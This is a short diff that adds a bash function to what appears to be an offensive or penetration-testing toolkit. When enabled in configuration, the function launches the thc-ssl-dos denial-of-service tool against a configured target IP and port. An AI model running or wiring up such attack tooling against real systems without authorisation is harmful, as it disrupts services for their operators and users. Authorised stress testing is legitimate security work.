@@ -1,0 +1,14 @@
+function brutetool_thcssldos {
+
+    if [ "$brutetool_thcssldos_enable" -eq "1" ]; then
+
+        thc-ssl-dos --accept -l "$brutetool_thcssldos_conlimit" "$targetip" "$targetport"
+
+    else
+
+        echo "thcssldos.func> Looks like this tool is disabled in configuration..."
+        echo "thcssldos.func> brutetool_thcssldos_enable="'"0"'""
+
+    fi
+
+}
